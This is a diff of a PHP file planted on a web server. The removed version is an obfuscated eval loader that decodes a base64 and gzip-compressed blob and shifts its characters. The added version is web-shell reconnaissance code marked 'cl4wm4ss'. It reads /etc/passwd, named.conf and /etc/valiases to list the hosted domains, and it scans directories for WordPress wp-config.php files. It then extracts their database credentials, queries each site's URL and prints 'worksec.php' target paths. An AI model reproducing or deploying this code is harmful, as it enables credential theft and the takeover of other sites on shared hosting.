@@ -1,11 +1,234 @@
-<?php 
+<?php
 
-function rjhybxjquaoswcskudsx($gqlsqmnthjhatkbxsgrvl){
-$gqlsqmnthjhatkbxsgrvl=gzinflate(base64_decode($gqlsqmnthjhatkbxsgrvl));
-for($hezwbvxpnplixaasxubjfl=0;$hezwbvxpnplixaasxubjfl<strlen($gqlsqmnthjhatkbxsgrvl);$hezwbvxpnplixaasxubjfl++){
-    $gqlsqmnthjhatkbxsgrvl[$hezwbvxpnplixaasxubjfl] = chr(ord($gqlsqmnthjhatkbxsgrvl[$hezwbvxpnplixaasxubjfl])-1);
+
+function GeT_D0MaIn_wiTh_SuB(){
+  $domain_lines = @scandir("/etc/valiases/");
+  if($domain_lines){
+    $domain_lines = array_diff($domain_lines, array('..', '.'));
+    foreach ($domain_lines as $ec_domain) {
+      $useridofdomain = @fileowner('/etc/valiases/'.$ec_domain);
+      if($useridofdomain){
+        if($useridofdomain == posix_geteuid()){
+          echo(''.$ec_domain.'<br>');
+        }
+      }
     }
-    return $gqlsqmnthjhatkbxsgrvl;}
-eval(rjhybxjquaoswcskudsx('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'));
+  }
+}
 
- ?>
+
+
+
+function Cl4WGetDomains($state = false){
+  $state = "named.conf";
+  $lines = array();
+  if(file_get_contents('/etc/named.conf')){
+    $lines = explode("\n", file_get_contents('/etc/named.conf'));
+  }
+  if(!$lines){
+    $lines = @scandir("/etc/valiases/");
+    if($lines){
+      $lines = array_diff($lines, array('..', '.'));
+    }
+    $state = "valiases";
+    if(!$lines){
+      $lines = @scandir("/var/named");
+      if($lines){
+        $lines = array_diff($lines, array('..', '.'));
+      }
+      $state = "named";
+      if(!$lines && $state){
+        if(file_get_contents('/etc/passwd')){
+          $lines = explode("\n", file_get_contents('/etc/passwd'));
+          $state = "passwd";
+        }
+      }
+    }
+  }
+  return array("lines" => $lines, "state" => $state);
+}
+
+
+
+
+function GeTdOmaInFrOmId(){
+  if(file_exists("/etc/valiases/")) {
+    $grabdomain_array = Cl4WGetDomains();
+    $grabdomain_lines = $grabdomain_array["lines"];
+    $grabdomain_state = $grabdomain_array["state"];
+    $etcpasswd = file_get_contents('/etc/passwd');
+    $etclines = explode("\n", $etcpasswd);
+    $all_domains = [];
+    foreach ($grabdomain_lines as $grabdomain_line) {
+      if($grabdomain_state == "named.conf"){
+        if(@strstr($grabdomain_line, 'zone')){
+          preg_match_all('#zone "(.*)"#',$grabdomain_line, $data);
+          $domain = $data[1][0];
+          array_push($all_domains, $domain);
+        }
+      } elseif($grabdomain_state == "valiases") {
+        array_push($all_domains, $grabdomain_line);
+      } elseif($grabdomain_state == "named") {
+        $domain = @rtrim($grabdomain_line, ".db");
+        array_push($all_domains, $domain);
+      }
+    }
+    if(function_exists('fileowner')) {
+      foreach ($all_domains as $each_domain){
+        $useridofdomain = @fileowner('/etc/valiases/'.$each_domain);
+        if(posix_geteuid() == $useridofdomain){
+          echo(''.$each_domain.'/worksec.php<br>');
+        }
+      }
+    } elseif(function_exists('exec')) {
+      foreach ($all_domains as $each_domain){
+        $exec_dom_res = @exec("stat -c '%U' /etc/valiases/".$each_domain);
+        if($exec_dom_res){
+          if(get_current_user() == $exec_dom_res){
+            echo(''.$each_domain.'/worksec.php<br>');
+          }
+        }
+      }
+    }
+  }
+}
+
+
+
+
+function get_DoM_frOm_etc(){
+  $firstfolderofdir = @substr(getcwd(), 1, stripos(substr($_SERVER['DOCUMENT_ROOT'], 1), '/'));
+  $eTc_DiR = '/'.$firstfolderofdir.'/'.get_current_user().'/etc';
+  if(file_exists($eTc_DiR)){
+    if(is_dir($eTc_DiR)){
+      chdir($eTc_DiR);
+      echo('<font color="green">DiR:'.$eTc_DiR.'</font><br>');
+      $etc_dir_scan = @scandir($eTc_DiR);
+      $etc_dir_scan_files = array_diff($etc_dir_scan, array('..', '.'));
+      foreach ($etc_dir_scan_files as $etc_dir_scan_file) {
+        if(is_dir($etc_dir_scan_file)){
+          echo(''.$etc_dir_scan_file.'/worksec.php<br>');
+        }
+      }
+
+    }
+  }
+}
+
+
+
+
+
+
+function url_from_wp_config($filename){
+	$configdata = @file_get_contents($filename);
+
+	if ($configdata){
+		preg_match_all("#'DB_HOST',.*'(.*?)'#", $configdata, $host);
+		foreach($host[1] as $don){ $localhost = $don; }
+
+		preg_match_all("#'DB_USER',.*'(.*?)'#", $configdata, $user);
+		foreach($user[1] as $done1){ $username = $done1; }
+
+		preg_match_all("#'DB_PASSWORD',.*'(.*?)'#", $configdata, $pass);
+		foreach($pass[1] as $done){ $password = $done; }
+
+
+		preg_match_all("#'DB_NAME',.*'(.*?)'#", $configdata, $name);
+		foreach($name[1] as $done2){ $database = $done2; }
+
+
+		preg_match_all("#$table_prefix.*=.*'(.*?)'#", $configdata, $prefixarr);
+		foreach($prefixarr[1] as $done3){ $prefix = $done3; }
+
+
+		if ( $localhost  &&  $password &&  $username && $database  && $prefix) {
+			$conn=@mysqli_connect($localhost,$username,$password,$database);
+
+			if($conn){
+				$site_query = mysqli_query($conn, "select * from " . $prefix . "options where option_name='siteurl'");
+				while ($siteurl = mysqli_fetch_array($site_query)) {
+					$site_url = $siteurl['option_value'];
+				}
+				echo(''.$site_url.'/worksec.php<br>');
+			}
+		}
+	}
+}
+
+
+
+function check_directory_for_domain($full_directory) {
+
+	if ( strpos($full_directory, "--cl4wm4ss--") !== false) {
+		$exploding_full_directory = explode("--cl4wm4ss--", $full_directory);
+		$directory = $exploding_full_directory[0];
+		$initial_folder = $exploding_full_directory[1];
+	} else {
+		$directory = $full_directory;
+		$initial_folder = '';
+	}
+
+	if (file_exists($directory)){
+		if (is_dir($directory)){
+			$all_scanned_folder = @array_diff(@scandir($directory), array('..', '.'));
+			foreach ($all_scanned_folder as $each_scanned_folder) {
+
+				$new_folder_dir1 = $directory . $each_scanned_folder;
+				if (is_dir($new_folder_dir1)){
+					$config_file_path1 = $new_folder_dir1 . '/' . $initial_folder . '/wp-config.php';
+					if (is_file($config_file_path1)){
+						url_from_wp_config($config_file_path1);
+					}
+
+
+					if (strpos($each_scanned_folder, '.') && strpos($each_scanned_folder, '.') !== 0 ){
+						echo(''.$each_scanned_folder.'/worksec.php<br>');
+					}
+
+					$all_scanned_folder2 = @array_diff(@scandir($new_folder_dir1), array('..', '.'));
+					foreach ($all_scanned_folder2 as $each_scanned_folder2){
+						$new_folder_dir2 = $new_folder_dir1 .'/'. $each_scanned_folder2;
+						if (is_dir($new_folder_dir2)){
+
+							$config_file_path2 = $new_folder_dir2 . '/' . $initial_folder . '/wp-config.php';
+							if (is_file($config_file_path2)){
+								url_from_wp_config($config_file_path2);
+							}
+
+							if (strpos($each_scanned_folder2, '.') && strpos($each_scanned_folder2, '.') !== 0 ){
+								echo(''.$each_scanned_folder2.'/worksec.php<br>');
+							}
+
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+function get_domain_from_dir(){
+	$c_directory = explode('/', $_SERVER['DOCUMENT_ROOT']."/");
+	$directory_to_check = array();
+	foreach ($c_directory as $posnum => $each_folder) {
+		if ($posnum > 2 ) {
+			$new_dir = implode("/" , array_slice($c_directory, 0, $posnum))."/";
+			echo($new_dir.'<br>');
+			check_directory_for_domain($new_dir);
+			@array_push($directory_to_check, $new_dir);
+			// $new_dir = implode("/" , array_slice($c_directory, 0, $posnum))."/--cl4wm4ss--/". implode("/", array_slice($c_directory, $posnum+1));
+			// echo($new_dir.'<br>');
+			// check_directory_for_domain($new_dir);
+			// @array_push($directory_to_check, $new_dir);
+		}
+	}
+}
+
+get_domain_from_dir();
+GeTdOmaInFrOmId();
+GeT_D0MaIn_wiTh_SuB();
+get_DoM_frOm_etc();
+
+
+?>
